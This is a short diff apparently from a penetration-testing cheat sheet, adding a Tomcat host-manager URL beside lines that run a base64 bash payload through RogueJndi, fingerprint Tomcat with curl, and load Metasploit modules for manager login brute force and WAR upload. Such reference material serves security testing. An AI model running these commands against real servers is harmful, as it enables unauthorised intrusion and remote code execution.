@@ -1019,6 +1019,7 @@ $ java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<base64 payload>} 
 
 ```
 http://<IP address>:<port>/manager/html
+http://<IP address>:<port>/host-manager
 $ curl -s http://<domain name>:8080/docs/ | grep Tomcat 
 msf > use auxiliary/scanner/http/tomcat_mgr_login
 msf > use exploit/multi/http/tomcat_mgr_upload
